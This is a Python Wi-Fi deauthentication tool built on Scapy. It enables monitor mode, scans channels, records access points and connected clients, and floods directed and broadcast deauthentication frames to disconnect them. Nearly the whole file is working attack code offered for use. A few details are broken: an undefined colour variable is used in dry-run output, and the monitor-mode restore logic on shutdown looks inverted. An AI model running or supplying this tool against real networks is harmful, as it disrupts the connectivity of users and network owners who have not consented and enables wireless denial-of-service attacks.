#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import fcntl
import struct
import socket
import argparse
from signal import SIGINT, signal
from subprocess import Popen, PIPE
from threading import Thread, Lock
import time
import sys
import os
import re
from scapy.all import *
import logging

# Подавить предупреждения Scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

# Цвета
W = '\033[0m'
R = '\033[31m'
G = '\033[32m'
O = '\033[33m'
T = '\033[93m'

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--skip", nargs='*', default=[], help="Skip MAC (e.g. -s 00:11:22:33:44:55)")
    parser.add_argument("-i", "--interface", help="Monitor interface (e.g. -i wlan0mon)")
    parser.add_argument("-c", "--channel", help="Fix on channel (e.g. -c 6)")
    parser.add_argument("-m", "--maximum", type=int, help="Max clients to deauth")
    parser.add_argument("-n", "--noupdate", action='store_true', help="Don't clear list after max")
    parser.add_argument("-t", "--timeinterval", help="Time between packets (e.g. -t 0.00001)")
    parser.add_argument("-p", "--packets", type=int, default=1, help="Deauth packets per burst")
    parser.add_argument("-d", "--directedonly", action='store_true', help="Skip broadcast deauths")
    parser.add_argument("-a", "--accesspoint", nargs='*', default=[], help="Target AP by SSID or MAC")
    parser.add_argument("--world", action="store_true", help="Use 13 channels (EU/Asia)")
    parser.add_argument("--dry-run", action='store_true', help="Do not send deauth packets")
    return parser.parse_args()

# === Работа с интерфейсами ===
def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=PIPE)
    except OSError:
        sys.exit(f'[{R}-{W}] Could not run "iwconfig"')
    out, _ = proc.communicate()
    for line in out.decode().split('\n'):
        if not line.strip() or re.match(r'lo|eth|usb|wwan', line):
            continue
        if 'IEEE 802.11' in line:
            iface = line.split()[0]
            if 'Mode:Monitor' in line:
                monitors.append(iface)
            else:
                interfaces[iface] = 'ESSID' in line
    return monitors, interfaces

def get_mon_iface(args):
    global monitor_on
    monitors, interfaces = iwconfig()
    if args.interface:
        if args.interface not in monitors:
            print(f'[{R}-{W}] Interface {R}{args.interface}{W} is not in monitor mode.')
            sys.exit(1)
        monitor_on = True
        return args.interface
    if monitors:
        monitor_on = True
        return monitors[0]
    if not interfaces:
        sys.exit(f'[{R}-{W}] No wireless interfaces found.')
    # Выбираем интерфейс с наибольшим количеством AP
    best_iface = ""
    best_count = 0
    for iface in interfaces:
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=PIPE)
        out, _ = proc.communicate()
        count = out.decode().count('Address:')
        print(f'[{G}+{W}] Found {T}{count}{W} networks on {G}{iface}{W}')
        if count > best_count:
            best_count = count
            best_iface = iface
    if not best_iface:
        sys.exit(f'[{R}-{W}] No usable interface found.')
    print(f'[{G}*{W}] Using {G}{best_iface}{W}')
    # Включаем monitor mode
    mon_iface = start_mon_mode(best_iface)
    return mon_iface

def start_mon_mode(interface):
    print(f'[{G}+{W}] Enabling monitor mode on {G}{interface}{W}')
    os.system(f'sudo ip link set {interface} down')
    os.system(f'sudo iw dev {interface} set type monitor')
    os.system(f'sudo ip link set {interface} up')
    time.sleep(1)
    return interface

def remove_mon_iface(mon_iface):
    print(f'[{G}*{W}] Disabling monitor mode on {G}{mon_iface}{W}')
    os.system(f'sudo ip link set {mon_iface} down')
    os.system(f'sudo iw dev {mon_iface} set type managed')
    os.system(f'sudo ip link set {mon_iface} up')

def mon_mac(mon_iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifname = mon_iface.encode('utf-8')
    try:
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
        mac = ':'.join('%02x' % b for b in info[18:24])
        print(f'[{G}*{W}] Monitor MAC: {O}{mac}{W}')
        return mac
    finally:
        s.close()

# === Глобальные переменные ===
clients_APs = []
APs = []
lock = Lock()
monitor_on = False
monchannel = "1"
first_pass = 1

# === Channel hopping ===
def channel_hop(mon_iface, args):
    global monchannel, first_pass
    channel = 0
    max_chan = 13 if args.world else 11
    while True:
        if args.channel:
            monchannel = args.channel
        else:
            channel = (channel % max_chan) + 1
            monchannel = str(channel)
            if channel == 1:
                first_pass = 0
            os.system(f"iw dev {mon_iface} set channel {monchannel}")
        output(None, monchannel)
        if not args.channel or first_pass:
            time.sleep(0.5)
        if not args.dry_run and not first_pass:
            deauth(monchannel)
        time.sleep(0.01)

# === Deauth ===
def deauth(monchannel):
    pkts = []
    with lock:
        for client, ap, ch, *essid in clients_APs:
            if ch == monchannel:
                pkts.append(Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth())
                pkts.append(Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth())
        if not args.directedonly:
            for ap, ch, essid in APs:
                if ch == monchannel:
                    pkts.append(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth())
    interval = float(args.timeinterval) if args.timeinterval else 0.00001
    for p in pkts:
        send(p, count=args.packets, inter=interval, verbose=False)

# === Вывод ===
def output(err, monchannel):
    os.system('clear')
    if args.dry_run:
        print(P + "*** DRY RUN ***" + W)
    if err:
        print(err)
    print(f'[{G}+{W}] {mon_iface} | Channel: {G}{monchannel}{W}\n')
    with lock:
        if clients_APs:
            print('           CLIENT               AP           CH   ESSID')
            for ca in clients_APs:
                essid = ca[3] if len(ca) > 3 else "Unknown"
                print(f' {O}{ca[0]:<17}  {O}{ca[1]:<17}  {ca[2]:<2}   {T}{essid}{W}')
        if APs:
            print('\n           AP MAC           CH   ESSID')
            for ap in APs:
                print(f' {O}{ap[0]:<17}  {ap[1]:<2}   {T}{ap[2]}{W}')
    print()

# === Фильтры ===
def noise_filter(addr1, addr2):
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:', '01:80:c2:', '01:00:5e:', mon_MAC]
    a1, a2 = addr1.lower(), addr2.lower()
    return any(i in a1 or i in a2 for i in ignore)

# === Callback для sniff() ===
def cb(pkt):
    global clients_APs, APs
    if args.maximum and len(clients_APs) >= args.maximum:
        if not args.noupdate:
            with lock:
                clients_APs.clear()
                APs.clear()
        return

    if pkt.haslayer(Dot11):
        addr1 = pkt.addr1.lower() if pkt.addr1 else ''
        addr2 = pkt.addr2.lower() if pkt.addr2 else ''
        if not addr1 or not addr2:
            return

        if args.skip and addr2 in [s.lower() for s in args.skip]:
            return

        # Target specific AP
        if args.accesspoint:
            bssids = [a for a in args.accesspoint if ':' in a]
            ssids = [a for a in args.accesspoint if ':' not in a]
            if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].info.decode('utf-8', errors='ignore') in ssids:
                bssids.append(pkt[Dot11].addr3.lower())
            if addr1 not in bssids and addr2 not in bssids:
                return

        if noise_filter(addr1, addr2):
            return

        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = pkt[Dot11].addr3.lower()
                channel = ord(pkt[Dot11Elt:3].info)
                chans = range(1, 14) if args.world else range(1, 12)
                if channel not in chans:
                    return
                if args.channel and str(channel) != args.channel:
                    return
                with lock:
                    if not any(ap[0] == bssid for ap in APs):
                        APs.append([bssid, str(channel), ssid])
            except:
                pass

        if pkt.type in [1, 2]:
            with lock:
                if not any(addr1 in ca and addr2 in ca for ca in clients_APs):
                    ch = monchannel
                    ssid = "Unknown"
                    for ap in APs:
                        if ap[0] in addr1 or ap[0] in addr2:
                            ch = ap[1]
                            ssid = ap[2]
                            break
                    clients_APs.append([addr1, addr2, ch, ssid])

# === Остановка ===
def stop_handler(signum, frame):
    print(f'\n[{R}!{W}] Shutting down...')
    if not monitor_on:
        remove_mon_iface(mon_iface)
    os.system('sudo service NetworkManager restart &')
    sys.exit(0)

# === Main ===
if __name__ == "__main__":
    args = parse_args()
    if os.geteuid() != 0:
        sys.exit(f'[{R}-{W}] Run as root!')

    DN = open(os.devnull, 'wb')
    args.skip = [s.lower() for s in args.skip]
    args.accesspoint = set(_.lower() if ':' in _ else _ for _ in args.accesspoint)

    global mon_iface, mon_MAC
    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)

    hop_thread = Thread(target=channel_hop, args=(mon_iface, args), daemon=True)
    hop_thread.start()

    signal(SIGINT, stop_handler)

    print(f"[{G}+{W}] Starting packet capture on {G}{mon_iface}{W}... Press Ctrl+C to stop.")
    try:
        sniff(iface=mon_iface, prn=cb, store=0)
    except PermissionError:
        print(f'[{R}!{W}] Permission denied. Is {mon_iface} in monitor mode?')
    except OSError as e:
        print(f'[{R}!{W}] Interface error: {e}')
    except Exception as e:
        print(f'[{R}!{W}] Unexpected error: {e}')
        import traceback
        traceback.print_exc()
    finally:
        stop_handler(None, None)